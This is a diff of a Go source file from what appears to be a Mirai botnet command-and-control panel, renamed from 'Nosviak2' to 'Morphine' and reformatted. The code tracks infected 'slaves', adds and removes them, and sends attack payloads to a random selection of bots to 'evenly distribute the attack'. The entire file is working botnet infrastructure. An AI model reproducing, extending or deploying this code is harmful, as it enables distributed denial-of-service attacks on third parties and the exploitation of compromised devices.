@@ -1,51 +1,53 @@
 package mirai
 
 import (
-	"Nosviak2/core/sources/language/static"
-	"Nosviak2/core/sources/layouts/toml"
-	"Nosviak2/core/clients/sessions"
-	"Nosviak2/core/sources/tools"
+	"Morphine/core/clients/sessions"
+	"Morphine/core/sources/language/static"
+	"Morphine/core/sources/layouts/toml"
+	"Morphine/core/sources/tools"
 	"log"
 	"math/rand"
-	"strings"
 	"net"
+	"os"
+	"strings"
 	"sync"
 	"time"
-	"os"
 )
 
-//stores information about the client
-//this will allow is to work without issues
+// stores information about the client
+// this will allow is to work without issues
 type Client struct { //stored inside a structure
-	Name string //stores the client name
-	Conn net.Conn //stores the connection
+	Name  string   //stores the client name
+	Conn  net.Conn //stores the connection
 	Queue chan []byte
-	ID int64
+	ID    int64
 }
 
 var (
 	//stores all of our slaves
 	//this will ensure we can mointer them
 	MiraiSlaves *Core = &Core{
-		All: make(map[int64]*Client),
+		All:   make(map[int64]*Client),
 		Count: 0,
 	}
 
 	//main mutex storage
 	mutex sync.Mutex
 )
-//controls the information about slaves
-//this will ensure its done without errors
+
+// controls the information about slaves
+// this will ensure its done without errors
 type Core struct {
-	Mutex sync.RWMutex //mutex for storage
-	All map[int64]*Client //all of the slaves
-	Count int //amount of slaves
+	Mutex sync.RWMutex      //mutex for storage
+	All   map[int64]*Client //all of the slaves
+	Count int               //amount of slaves
 }
 
-//Adds the client into the map
-//saves a client into the map properly
+// Adds the client into the map
+// saves a client into the map properly
 func (c *Client) Add() {
-	MiraiSlaves.Mutex.Lock(); mutex.Lock()
+	MiraiSlaves.Mutex.Lock()
+	mutex.Lock()
 	defer MiraiSlaves.Mutex.Unlock()
 	defer mutex.Unlock()
 
@@ -67,19 +69,19 @@ func (c *Client) Add() {
 	}
 }
 
-//Removes the client from the map
-//removes the certain client from the map
+// Removes the client from the map
+// removes the certain client from the map
 func (c *Client) Remove() {
-	MiraiSlaves.Mutex.Lock(); mutex.Lock() //locks
+	MiraiSlaves.Mutex.Lock()
+	mutex.Lock()                     //locks
 	defer MiraiSlaves.Mutex.Unlock() //unlocks
-	defer mutex.Unlock() //unlocks
+	defer mutex.Unlock()             //unlocks
 
 	//deletes the slave properly
 	delete(MiraiSlaves.All, c.ID)
 	MiraiSlaves.Count-- //count properly
 
 	System := BinAppears(c.Name)
-	
 
 	//dynamic system properly and safely
 	//this will ensure its done without errors happenign
@@ -92,13 +94,11 @@ func (c *Client) Remove() {
 	}
 }
 
-
-//sends the payload properly
-//this will evenly distribute the attack
+// sends the payload properly
+// this will evenly distribute the attack
 func Send(payload []byte, s *sessions.Session) error {
 	MiraiSlaves.Mutex.Lock()
 	defer MiraiSlaves.Mutex.Unlock()
-
 
 	var targets map[int64]*Client = MiraiSlaves.All
 	//this will help us get there slaves
@@ -110,12 +110,13 @@ func Send(payload []byte, s *sessions.Session) error {
 		//this will ensure its done without errors happening
 		for pos := 0; pos < s.User.MaxSlaves; pos++ { //loops through
 			current := rand.Intn(len(MiraiSlaves.All)) //generates a random number
-			var position int = 0 //ranges through all slaves
-			for Key, Slave := range MiraiSlaves.All { //ranges through
+			var position int = 0                       //ranges through all slaves
+			for Key, Slave := range MiraiSlaves.All {  //ranges through
 				if position == current { //compares the current with wanted
 					targets[Key] = Slave //saves into the array properly
-					break //breaks from the looping properly
-				}; position++
+					break                //breaks from the looping properly
+				}
+				position++
 			}
 		}
 	}
@@ -124,5 +125,6 @@ func Send(payload []byte, s *sessions.Session) error {
 	for _, slave := range targets {
 		//tries to forward the payload
 		slave.Queue <- payload
-	}; return nil
+	}
+	return nil
 }
